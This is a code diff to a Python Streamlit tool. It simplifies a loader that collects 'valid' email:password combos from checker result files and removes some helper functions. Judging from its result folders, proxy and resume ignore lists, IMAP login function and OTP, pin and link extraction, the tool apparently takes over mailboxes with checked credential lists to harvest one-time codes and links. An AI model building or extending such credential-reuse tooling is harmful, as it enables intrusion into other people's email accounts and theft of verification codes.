@@ -267,20 +267,15 @@ def otp_log(msg):
 
 
 def load_valid():
-    """Scans valid results files and app logs specifically for authenticated/valid accounts,
-    strictly ignoring any unfinished/resume files that contain unchecked accounts."""
-    valid_map = {} # email_lower -> (timestamp_dt, combo_str)
+    """Optimized instant loader: Scans only valid text result files, bypassing heavy log scanning."""
+    valid_map = {}
     
     search_patterns = [
         "mail_results/*valid*.txt",
         "mail_results/*clean*.txt",
         "*valid*.txt",
         "*clean*.txt",
-        "manual_valid_accounts.txt",
-        "mail_results/*.log",
-        "*.log",
-        "mail_results/*.json",
-        "*.json"
+        "manual_valid_accounts.txt"
     ]
     
     all_files = []
@@ -288,7 +283,6 @@ def load_valid():
         all_files.extend(glob.glob(pat, recursive=True))
         
     all_files = list(dict.fromkeys([p for p in all_files if os.path.isfile(p)]))
-    
     ignore_keywords = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]
     
     for path in all_files:
@@ -299,43 +293,25 @@ def load_valid():
         try:
             file_mtime = datetime.fromtimestamp(os.path.getmtime(path))
             with open(path, encoding="utf-8", errors="ignore") as f:
-                content = f.read()
-                
-                if path.endswith(".log") or "log" in filename_lower:
-                    valid_lines = re.findall(r'\[VALID\]\s*([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)\s*->\s*([^\s|<>\n]+)|\[VALID\]\s*([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-.]+:([^\s|<>\n]+))', content)
-                    for m in valid_lines:
-                        email_p = (m[0] or m[2]).strip().lower()
-                        pass_p = (m[1] or m[3]).strip()
-                        if ":" in email_p:
-                            parts = email_p.split(":", 1)
-                            email_p, pass_p = parts[0], parts[1]
-                        
-                        if email_p and pass_p:
-                            combo_str = f"{email_p}:{pass_p}"
-                            if email_p not in valid_map or file_mtime > valid_map[email_p][0]:
-                                valid_map[email_p] = (file_mtime, combo_str)
-                else:
-                    matches = re.findall(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+\s*[:|]\s*[^\s<>\n"\'\]\}]+)', content)
-                    for m in matches:
-                        clean_combo = m.replace("|", ":").replace(" ", "").strip('"\'')
-                        if ":" not in clean_combo:
-                            continue
-                        parts = clean_combo.split(":", 1)
-                        email_part = parts[0].strip().lower().strip('"\'')
-                        pwd_part = parts[1].strip().strip('"\'')
-                        
-                        if "@" not in email_part or "." not in email_part or not pwd_part:
-                            continue
-                            
-                        combo_str = f"{email_part}:{pwd_part}"
-                        
-                        if email_part not in valid_map or file_mtime > valid_map[email_part][0]:
-                            valid_map[email_part] = (file_mtime, combo_str)
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    clean_combo = line.split("|")[0].replace(" ", "").strip('"\'')
+                    if ":" not in clean_combo:
+                        continue
+                    parts = clean_combo.split(":", 1)
+                    email_part = parts[0].strip().lower()
+                    pwd_part = parts[1].strip()
+                    if "@" not in email_part or "." not in email_part or not pwd_part:
+                        continue
+                    combo_str = f"{email_part}:{pwd_part}"
+                    if email_part not in valid_map or file_mtime > valid_map[email_part][0]:
+                        valid_map[email_part] = (file_mtime, combo_str)
         except Exception:
             continue
             
     sorted_items = sorted(valid_map.values(), key=lambda x: x[0], reverse=True)
-    
     options = []
     for file_mtime, combo_str in sorted_items:
         time_label = f"# Found: {file_mtime.strftime('%Y-%m-%d %H:%M:%S')}"
@@ -604,18 +580,7 @@ def open_mail(email_addr, password_val, host_val, timeout=None):
     return mail
 
 
-def close_mail(mail):
-    try:
-        mail.logout()
-    except Exception:
-        try:
-            mail.shutdown()
-        except Exception:
-            pass
-
-
 def get_active_mail(email_addr, password_val, host_val):
-    """Returns an active persistent mail connection, ensuring it reconnects or switches cleanly if the account changes."""
     current_combo = f"{email_addr}:{password_val}"
     if st.session_state.get("connected_account_combo") != current_combo or not st.session_state.get("active_mail"):
         if st.session_state.active_mail:
@@ -687,11 +652,6 @@ def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None
         categories.append("🤖 BOT MSG")
 
     return categories
-
-
-def is_bot_message(subject, body, frm=""):
-    cats = detect_specific_categories(subject, body, frm)
-    return len(cats) > 0
 
 
 def extract_pins_and_links(text):
